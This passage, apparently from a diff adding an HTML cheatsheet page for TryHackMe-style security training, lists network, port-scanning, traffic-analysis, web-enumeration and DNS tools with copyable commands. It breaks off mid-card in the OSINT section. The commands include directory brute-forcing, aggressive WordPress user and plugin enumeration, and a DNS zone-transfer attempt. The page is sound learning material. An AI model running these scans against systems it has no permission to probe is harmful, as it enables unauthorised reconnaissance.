@@ -1,0 +1,1568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>THM Cybersecurity 101 Tools Cheatsheet</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+
+
+  :root {
+    --bg:      #0b0d12;
+    --surface: #111418;
+    --card:    #161a22;
+    --border:  #252c38;
+    --border2: #2e3847;
+    --text:    #cdd6e0;
+    --muted:   #627080;
+    --accent:  #38bdf8;
+    --green:   #34d399;
+    --orange:  #fb923c;
+    --red:     #f87171;
+    --pink:    #f472b6;
+    --mono:    'IBM Plex Mono', monospace;
+    --sans:    'IBM Plex Sans', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--sans);
+    background: var(--bg);
+    color: var(--text);
+    padding-top: 54px;
+    line-height: 1.5;
+    font-size: 15px;
+  }
+
+  /* ── TOP BAR ── */
+  .topbar {
+    position: fixed; top: 0; left: 0; right: 0;
+    height: 54px; z-index: 300;
+    background: rgba(11,13,18,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center;
+    padding: 0 18px;
+  }
+  .topbar-title {
+    position: absolute; left: 0; right: 0;
+    text-align: center;
+    pointer-events: none;
+    font-family: var(--mono);
+    font-size: 1.1rem; font-weight: 600;
+    letter-spacing: 0.04em;
+    color: var(--accent);
+  }
+  .topbar-btns {
+    display: flex; gap: 8px; margin-left: auto; position: relative; z-index: 1;
+  }
+  .icon-btn {
+    background: none;
+    border: 1px solid var(--border2);
+    color: var(--muted);
+    width: 34px; height: 34px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 15px;
+    display: flex; align-items: center; justify-content: center;
+    transition: color .15s, border-color .15s;
+  }
+  .icon-btn:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* ── SIDENAV ── */
+  #sidenav {
+    position: fixed; top: 54px; left: 0; bottom: 0;
+    width: 0; overflow: hidden;
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    z-index: 200;
+    transition: width .22s ease;
+    overflow-y: auto;
+  }
+  #sidenav.open { width: 230px; }
+  .nav-group {
+    padding: 16px 14px 4px;
+    font-size: 0.68rem; font-weight: 700;
+    letter-spacing: .12em; text-transform: uppercase;
+    color: var(--muted);
+  }
+  #sidenav a {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 14px;
+    font-size: 0.88rem; font-weight: 600;
+    color: var(--muted);
+    text-decoration: none;
+    border-left: 2px solid transparent;
+    white-space: nowrap;
+    transition: all .12s;
+  }
+  #sidenav a:hover, #sidenav a.active {
+    color: var(--text);
+    background: var(--border);
+    border-left-color: var(--accent);
+  }
+  #sidenav a .ni { width: 18px; text-align: center; font-size: 0.9rem; }
+
+  /* ── MAIN ── */
+  main { max-width: 1440px; margin: 0 auto; padding: 28px 20px 0; transition: padding-left .22s; }
+  main.shifted { padding-left: 252px; }
+
+  /* ── SEARCH ── */
+  .search-wrap { position: relative; margin-bottom: 26px; }
+  #search {
+    width: 100%; padding: 10px 14px 10px 40px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 7px; color: var(--text);
+    font-family: var(--sans); font-size: 0.85rem;
+    outline: none; transition: border-color .15s;
+  }
+  #search:focus { border-color: var(--accent); }
+  #search::placeholder { color: var(--muted); }
+  .s-icon {
+    position: absolute; left: 13px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--muted); font-size: 0.9rem; pointer-events: none;
+  }
+  #s-clear {
+    position: absolute; right: 11px; top: 50%;
+    transform: translateY(-50%);
+    background: none; border: none; color: var(--muted);
+    cursor: pointer; font-size: 1rem; display: none;
+  }
+  #s-clear:hover { color: var(--text); }
+
+  /* ── SECTION ── */
+  section { scroll-margin-top: 72px; margin-bottom: 48px; }
+  .sec-hdr {
+    display: flex; align-items: center; gap: 10px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px; margin-bottom: 18px;
+  }
+  .sec-hdr h2 {
+    font-size: 1.0rem; font-weight: 700;
+    letter-spacing: .10em; text-transform: uppercase;
+    color: var(--accent);
+  }
+  .sec-count {
+    margin-left: auto;
+    font-family: var(--mono); font-size: 0.65rem; color: var(--muted);
+  }
+
+  /* ── GRID ── */
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 12px; }
+
+  /* ── CARD ── */
+  .tool-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    display: flex; flex-direction: column; gap: 10px;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .tool-card:hover {
+    border-color: var(--border2);
+    box-shadow: 0 0 0 1px var(--border2);
+  }
+
+  /* Card header: name + tag */
+  .card-hdr { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+  .tool-link {
+    font-family: var(--mono); font-size: 0.95rem; font-weight: 600;
+    color: var(--accent); text-decoration: none;
+    transition: color .12s;
+  }
+  .tool-link:hover { color: #fff; }
+  .tool-link.no-href { pointer-events: none; }
+
+  .tag {
+    font-size: 0.58rem; font-weight: 700; letter-spacing: .1em;
+    text-transform: uppercase; padding: 2px 7px; border-radius: 4px;
+    white-space: nowrap; flex-shrink: 0;
+  }
+  .t-cli  { background: #0e1f17; color: var(--green);  border: 1px solid #34d39930; }
+  .t-gui  { background: #1f0e0e; color: var(--red);    border: 1px solid #f8717130; }
+  .t-web  { background: #0d1722; color: var(--accent); border: 1px solid #38bdf830; }
+
+  /* Description */
+  .desc {
+    font-size: 0.83rem; line-height: 1.5;
+    color: var(--muted);
+  }
+
+  /* Sub-label above complex command */
+  .cmd-sublabel {
+    font-size: 0.67rem; font-weight: 700;
+    letter-spacing: .1em; text-transform: uppercase;
+    color: var(--muted);
+    margin-top: 2px;
+  }
+  .cmd-sublabel span { color: var(--orange); }
+
+  /* ── CMD BOX ── */
+  .cmd-box {
+    background: #08090e;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 11px 14px;
+    font-family: var(--mono);
+    font-size: 0.8rem;
+    line-height: 1.7;
+    cursor: pointer;
+    position: relative;
+    transition: border-color .15s;
+    /* prevent word breaking */
+    overflow-x: auto;
+    white-space: pre;
+    word-break: normal;
+    overflow-wrap: normal;
+  }
+  .cmd-box:hover { border-color: var(--accent); }
+  .cmd-box.copied { border-color: var(--green) !important; }
+  .copy-tag {
+    position: absolute; right: 8px; top: 8px;
+    font-size: 0.55rem; letter-spacing: .08em; text-transform: uppercase;
+    color: var(--muted); pointer-events: none; font-family: var(--mono);
+    z-index: 2;
+  }
+  .cmd-box:hover .copy-tag { color: var(--accent); }
+  .cmd-box.copied .copy-tag { color: var(--green); }
+
+  /* Syntax colors */
+  .b { color: var(--green); }
+  .f { color: var(--orange); }
+  .a { color: #93c5fd; }
+  .s { color: var(--pink); }
+  .p { color: var(--red); }
+
+  /* ── GUI NOTE (clickable box) ── */
+  .gui-note {
+    background: #0f0a0e;
+    border: 1px dashed #f8717140;
+    border-radius: 6px;
+    padding: 10px 14px;
+    font-size: 0.78rem;
+    font-family: var(--sans);
+    color: #f87171bb;
+    line-height: 1.6;
+    cursor: pointer;
+    position: relative;
+    transition: border-color .15s, background .15s;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: normal;
+    overflow-wrap: normal;
+  }
+  .gui-note:hover { border-color: #f87171; background: #140b0e; }
+  .expand-hint {
+    display: block;
+    font-size: 0.6rem; font-weight: 700; letter-spacing: .1em;
+    text-transform: uppercase; color: #f8717166;
+    margin-bottom: 6px;
+  }
+  .gui-note:hover .expand-hint { color: var(--red); }
+
+  /* ── MODAL ── */
+  .modal-overlay {
+    display: none;
+    position: fixed; inset: 0; z-index: 1000;
+    background: rgba(0,0,0,0.78);
+    backdrop-filter: blur(5px);
+    align-items: center; justify-content: center;
+  }
+  .modal-overlay.open { display: flex; }
+  .modal {
+    background: #13171f;
+    border: 1px solid var(--border2);
+    border-radius: 12px;
+    width: min(560px, 94vw);
+    max-height: 82vh;
+    display: flex; flex-direction: column;
+    overflow: hidden;
+    box-shadow: 0 28px 72px rgba(0,0,0,0.65);
+    animation: mIn .18s ease;
+  }
+  @keyframes mIn {
+    from { opacity: 0; transform: scale(0.96) translateY(10px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+  }
+  .modal-hdr {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 18px 22px 15px;
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  .modal-hdr h3 {
+    font-family: var(--sans); font-size: 1rem; font-weight: 700;
+    color: var(--text);
+  }
+  .modal-hdr h3 span { color: var(--red); margin-right: 8px; }
+  .modal-close {
+    background: none; border: none; color: var(--muted);
+    font-size: 1.1rem; cursor: pointer; padding: 3px 7px;
+    border-radius: 4px; transition: color .12s, background .12s;
+    line-height: 1;
+  }
+  .modal-close:hover { color: var(--text); background: var(--border); }
+  .modal-body {
+    padding: 20px 22px; overflow-y: auto;
+    display: flex; flex-direction: column; gap: 0;
+  }
+  .modal-step {
+    display: flex; gap: 14px; align-items: flex-start;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .modal-step:last-child { border-bottom: none; }
+  .step-num {
+    flex-shrink: 0;
+    width: 26px; height: 26px;
+    background: #f8717115; border: 1px solid #f8717135;
+    border-radius: 50%;
+    font-family: var(--sans); font-size: 0.72rem; font-weight: 700;
+    color: var(--red);
+    display: flex; align-items: center; justify-content: center;
+    margin-top: 2px;
+  }
+  .step-body { flex: 1; display: flex; flex-direction: column; gap: 6px; }
+  .step-label {
+    font-family: var(--sans);
+    font-size: 0.8rem; font-weight: 700;
+    color: var(--text);
+  }
+  .step-cmd {
+    font-family: var(--mono); font-size: 0.78rem;
+    background: #08090e; border: 1px solid var(--border);
+    border-radius: 5px; padding: 8px 12px;
+    color: var(--accent); line-height: 1.6;
+    white-space: pre-wrap; word-break: normal;
+    overflow-wrap: normal; overflow-x: auto;
+  }
+  .step-note {
+    font-family: var(--sans);
+    font-size: 0.78rem; color: var(--muted);
+    line-height: 1.5;
+  }
+
+  /* ── FOOTER ── */
+  .footer {
+    border-top: 1px solid var(--border);
+    margin-top: 56px; padding: 44px 20px 52px;
+    display: flex; flex-direction: column;
+    align-items: center; gap: 28px;
+  }
+  .footer-name {
+    font-family: var(--mono); font-size: 1rem; font-weight: 600;
+    color: var(--text); letter-spacing: .04em;
+  }
+  .footer-links {
+    display: flex; align-items: center; gap: 16px;
+    flex-wrap: wrap; justify-content: center;
+  }
+  .footer-link {
+    display: flex; align-items: center; gap: 9px;
+    text-decoration: none;
+    font-size: 0.83rem; font-family: var(--sans); font-weight: 600;
+    color: var(--muted);
+    padding: 10px 18px;
+    border-radius: 8px;
+    border: 1px solid var(--border2);
+    background: var(--surface);
+    transition: color .15s, border-color .15s, background .15s, transform .15s;
+    white-space: nowrap;
+  }
+  .footer-link:hover {
+    color: var(--accent);
+    border-color: var(--accent);
+    background: var(--card);
+    transform: translateY(-2px);
+  }
+  .footer-link svg { width: 17px; height: 17px; flex-shrink: 0; }
+  .footer-link .link-label { color: var(--text); }
+  .footer-link:hover .link-label { color: var(--accent); }
+
+  /* ── LIGHT MODE ── */
+  body.light {
+    --bg: #eef1f6; --surface: #f8fafc; --card: #ffffff;
+    --border: #c8d2de; --border2: #b0becf;
+    --text: #0d1520; --muted: #3d5068;
+    --accent: #0369a1; --green: #065f46;
+    --orange: #92400e; --red: #991b1b;
+  }
+  body.light .cmd-box { background: #edf1f7; color: #0d1520; }
+  body.light .cmd-box:hover { background: #e4eaf3; }
+  body.light .gui-note { background: #fff0f0; color: #991b1b; border-color: #fca5a530; }
+  body.light .gui-note:hover { background: #ffe4e4; border-color: #ef4444; }
+  body.light .expand-hint { color: #fca5a5; }
+  body.light .gui-note:hover .expand-hint { color: var(--red); }
+  body.light .topbar { background: rgba(238,241,246,0.97); }
+  body.light .modal { background: #f8fafc; }
+  body.light .step-cmd { background: #edf1f7; color: #0369a1; border-color: var(--border); }
+  body.light .b { color: #065f46; }
+  body.light .f { color: #92400e; }
+  body.light .a { color: #1e40af; }
+  body.light .s { color: #9d174d; }
+  body.light .p { color: #991b1b; }
+
+  .hidden { display: none !important; }
+
+  @media (max-width: 640px) {
+    .grid { grid-template-columns: 1fr; }
+    main.shifted { padding-left: 20px; }
+    .footer-links { flex-direction: column; align-items: stretch; }
+    .footer-link { justify-content: center; }
+  }
+
+* {
+    scrollbar-width: thin;
+    scrollbar-color: var(--border2) transparent;
+  }
+
+  *::-webkit-scrollbar {
+    height: 6px;
+    width: 6px;
+  }
+
+  *::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  *::-webkit-scrollbar-thumb {
+    background: var(--border2);
+    border-radius: 10px;
+  }
+
+  *::-webkit-scrollbar-thumb:hover {
+    background: var(--accent);
+  }
+
+  .email-badge {
+    font-size: 0.7rem; margin-left: 5px; opacity: 0.5;
+    transition: opacity .15s;
+  }
+  #email-btn:hover .email-badge { opacity: 1; color: var(--accent); }
+
+
+  .portfolio-link {
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    font-weight: 600;
+    color: var(--muted);
+    text-decoration: none;
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 5px 11px;
+    margin-left: 10px;
+    white-space: nowrap;
+    letter-spacing: 0.03em;
+    transition: color .15s, border-color .15s;
+    position: relative; z-index: 1;
+  }
+  .portfolio-link:hover { color: var(--accent); border-color: var(--accent); }
+
+</style>
+<body>
+</head>
+<!-- TOP BAR -->
+<div class="topbar">
+  <button class="icon-btn" onclick="toggleNav()" title="Toggle menu">☰</button>
+  <a href="http://dalli-krichen.github.io/" target="_blank" class="portfolio-link">Visit my portfolio</a>
+  <div class="topbar-title"> Cyber-Security Tools Cheatsheet</div>
+  <div class="topbar-btns">
+    <button class="icon-btn" onclick="toggleTheme()" title="Toggle light/dark">◑</button>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal-overlay" onclick="closeModalOutside(event)">
+  <div class="modal">
+    <div class="modal-hdr">
+      <h3><span id="modal-icon"></span><span id="modal-title"></span></h3>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body" id="modal-body"></div>
+  </div>
+</div>
+
+<!-- SIDENAV -->
+<nav id="sidenav">
+  <div class="nav-group">Networking</div>
+  <a href="#net"><span class="ni">📡</span>Network Utilities</a>
+  <a href="#scanning"><span class="ni">🛰️</span>Port Scanning</a>
+  <a href="#traffic"><span class="ni">🔎</span>Traffic Analysis</a>
+
+  <div class="nav-group">Recon & Enumeration</div>
+  <a href="#web-enum"><span class="ni">🌐</span>Web Enumeration</a>
+  <a href="#osint"><span class="ni">🌍</span>OSINT & DNS</a>
+
+  <div class="nav-group">Exploitation</div>
+  <a href="#web-exploit"><span class="ni">🧪</span>Web Exploitation</a>
+  <a href="#brute"><span class="ni">🔐</span>Brute Force</a>
+  <a href="#pw"><span class="ni">🔑</span>Password Cracking</a>
+  <a href="#exploit-fw"><span class="ni">💥</span>Exploit Frameworks</a>
+  <a href="#shells"><span class="ni">🐚</span>Shells & Listeners</a>
+
+  <div class="nav-group">Post-Exploitation</div>
+  <a href="#windows"><span class="ni">🪟</span>Windows & AD</a>
+  <a href="#linux"><span class="ni">🐧</span>Linux Utilities</a>
+  <a href="#privesc"><span class="ni">⬆️</span>Priv Escalation</a>
+
+  <div class="nav-group">Forensics & RE</div>
+  <a href="#forensics"><span class="ni">📁</span>Forensics & Stego</a>
+  <a href="#malware"><span class="ni">🔬</span>Malware & RE</a>
+  <a href="#static"><span class="ni">🧩</span>Static Analysis</a>
+  <a href="#liveir"><span class="ni">🔭</span>Live Analysis & IR</a>
+  <a href="#winpost"><span class="ni">⚔️</span>Win Post-Exploit</a>
+
+  <div class="nav-group">Defensive</div>
+  <a href="#defense"><span class="ni">🛡️</span>Defensive Tools</a>
+
+  <div class="nav-group">Crypto & Misc</div>
+  <a href="#crypto"><span class="ni">🔒</span>Cryptography</a>
+  <a href="#cli"><span class="ni">🧰</span>CLI Utilities</a>
+</nav>
+
+<!-- MAIN -->
+<main id="main">
+  <div class="search-wrap">
+    <span class="s-icon">🔍</span>
+    <input type="text" id="search" placeholder="Filter tools by name, tag, or command…" oninput="filterTools()">
+    <button id="s-clear" onclick="clearSearch()">✕</button>
+  </div>
+
+  <!-- ═══════════════════════════════════ NETWORK UTILITIES -->
+  <section id="net">
+    <div class="sec-hdr"><span>📡</span><h2>Network Utilities</h2><span class="sec-count">8 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/8/ping" target="_blank" class="tool-link">ping</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Tests host reachability via ICMP. Shows round-trip time and packet loss.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ping</span> <span class="f">-c 4</span> <span class="a">10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/8/traceroute" target="_blank" class="tool-link">traceroute / tracert</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Traces the packet route to a host hop by hop. Use <code>tracert</code> on Windows.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">traceroute</span> <span class="f">-n</span> <span class="a">target.com</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/telnet" target="_blank" class="tool-link">telnet</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Connects to any TCP port in plaintext. Used for banner grabbing and manual protocol testing (HTTP, SMTP).</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">telnet</span> <span class="a">10.10.10.10 80</span>
+<span class="s">GET / HTTP/1.0</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://curl.se/docs/manpage.html" target="_blank" class="tool-link">curl</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Transfers data via HTTP/S, FTP and more. Essential for inspecting headers and testing APIs from the terminal.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">curl</span> <span class="f">-s -L -I</span> <span class="a">http://site.com</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.gnu.org/software/wget/manual/wget.html" target="_blank" class="tool-link">wget</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Non-interactive file downloader. Supports recursive mirroring of entire websites.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">wget</span> <span class="f">-q -O</span> <span class="a">file.txt http://10.9.0.1:8000/file</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://man7.org/linux/man-pages/man8/netstat.8.html" target="_blank" class="tool-link">netstat</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Displays active connections, listening ports, and routing tables. Useful for detecting backdoors.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">netstat</span> <span class="f">-tulnp</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/arp-scan" target="_blank" class="tool-link">arp-scan</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Sends ARP packets to discover all live hosts on a local subnet. Faster than ping-sweeping.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">arp-scan</span> <span class="f">-I eth0 --localnet</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/8/ifconfig" target="_blank" class="tool-link">ifconfig / ip</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Display and configure network interfaces. <code>ip</code> is the modern replacement for the legacy <code>ifconfig</code>.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ip</span> <span class="f">a</span>
+<span class="b">ip</span> <span class="f">route show</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ PORT SCANNING -->
+  <section id="scanning">
+    <div class="sec-hdr"><span>🛰️</span><h2>Port Scanning & Recon</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://nmap.org/book/man.html" target="_blank" class="tool-link">nmap</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">The definitive network mapper. Host discovery, port scanning, OS/service detection, and NSE scripts.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">nmap</span> <span class="f">-sC -sV -p-</span> <span class="a">10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/RustScan/RustScan/wiki/Usage" target="_blank" class="tool-link">RustScan</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Ultra-fast port scanner written in Rust. Finds open ports in seconds, then passes them into Nmap.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">rustscan</span> <span class="f">-a</span> <span class="a">10.10.10.10</span> <span class="f">--ulimit 5000 --</span> <span class="f">-sC -sV</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/netdiscover/" target="_blank" class="tool-link">netdiscover</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Active/passive ARP tool to find live hosts on local networks without noisy IP traffic.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">netdiscover</span> <span class="f">-i eth0 -r</span> <span class="a">10.0.0.0/24</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ TRAFFIC ANALYSIS -->
+  <section id="traffic">
+    <div class="sec-hdr"><span>🔎</span><h2>Traffic Analysis</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card" data-guide="Wireshark">
+        <div class="card-hdr"><a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" class="tool-link">Wireshark</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Industry-leading graphical packet analyzer with deep dissection of hundreds of protocols.</p>
+        <div class="gui-note" onclick="openGuide('Wireshark')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>http → all HTTP traffic
+tcp.port == 4444 → filter by port
+Right-click → Follow TCP Stream</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.tcpdump.org/manpages/tcpdump.1.html" target="_blank" class="tool-link">tcpdump</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Command-line packet sniffer. Captures to .pcap files for later analysis in Wireshark.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">tcpdump</span> <span class="f">-i eth0 -n -w</span> <span class="a">cap.pcap</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" class="tool-link">TShark</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Terminal version of Wireshark. Read .pcap files and extract specific protocol fields from the CLI.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">tshark</span> <span class="f">-r</span> <span class="a">cap.pcap</span> <span class="f">-Y</span> <span class="s">"http.request"</span> <span class="f">-T fields -e http.host -e http.request.uri</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ WEB ENUMERATION -->
+  <section id="web-enum">
+    <div class="sec-hdr"><span>🌐</span><h2>Web Enumeration</h2><span class="sec-count">7 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/OJ/gobuster/blob/master/README.md" target="_blank" class="tool-link">gobuster</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Fast directory/file brute-forcer and DNS subdomain enumerator written in Go.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">gobuster dir</span> <span class="f">-u</span> <span class="a">http://site.com</span> <span class="f">-w</span> <span class="a">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="f">-x php,html,txt -t 50</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/ffuf/ffuf/blob/master/README.md" target="_blank" class="tool-link">ffuf</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Extremely fast Go-based web fuzzer. Place <code>FUZZ</code> anywhere — paths, params, headers, subdomains.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ffuf</span> <span class="f">-u</span> <span class="a">http://site.com/FUZZ</span> <span class="f">-w</span> <span class="a">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="f">-mc 200,301 -t 50</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.kali.org/tools/dirb/" target="_blank" class="tool-link">dirb</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Classic recursive web content scanner with a built-in wordlist. Simple to use for quick checks.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">dirb</span> <span class="a">http://site.com</span> <span class="a">/usr/share/wordlists/dirb/big.txt</span> <span class="f">-X .php,.txt</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/maurosoria/dirsearch#usage" target="_blank" class="tool-link">dirsearch</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Python directory brute-forcer with built-in extension support and colored output.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">dirsearch</span> <span class="f">-u</span> <span class="a">http://site.com</span> <span class="f">-e php,html,txt -t 40</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/sullo/nikto/wiki" target="_blank" class="tool-link">nikto</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Web server scanner — checks for dangerous files, outdated software, and misconfigurations.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">nikto</span> <span class="f">-h</span> <span class="a">http://site.com</span> <span class="f">-Tuning 9</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/urbanadventurer/WhatWeb/wiki" target="_blank" class="tool-link">whatweb</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Fingerprints web technologies — CMS, frameworks, JS libraries, server software — from headers and HTML.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">whatweb</span> <span class="f">-a 3 -v</span> <span class="a">http://site.com</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation" target="_blank" class="tool-link">wpscan</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">WordPress-specific scanner. Finds vulnerable plugins, themes, users, and configuration issues.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">wpscan</span> <span class="f">--url</span> <span class="a">http://site.com</span> <span class="f">--enumerate u,vp --plugins-detection aggressive</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ OSINT & DNS -->
+  <section id="osint">
+    <div class="sec-hdr"><span>🌍</span><h2>OSINT & DNS</h2><span class="sec-count">5 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/whois" target="_blank" class="tool-link">whois</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Queries registrar databases for domain ownership, nameservers, and registration dates.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">whois</span> <span class="a">target.com</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/dig" target="_blank" class="tool-link">dig</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">DNS lookup utility. Queries any record type (A, MX, NS, TXT, AXFR) from any nameserver.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">dig</span> <span class="f">any</span> <span class="a">target.com</span>
+<span class="b">dig</span> <span class="f">axfr @ns1.target.com</span> <span class="a">target.com</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/nslookup" target="_blank" class="tool-link">nslookup</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Classic DNS query tool available on Linux and Windows. Good for quick interactive lookups.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">nslookup</span> <span class="f">-type=MX</span> <span class="a">target.com 8.8.8.8</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/laramies/theHarvester#readme" target="_blank" class="tool-link">theHarvester</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Gathers emails, subdomains, IPs, and URLs from public sources like Google, Bing, and LinkedIn.</p>
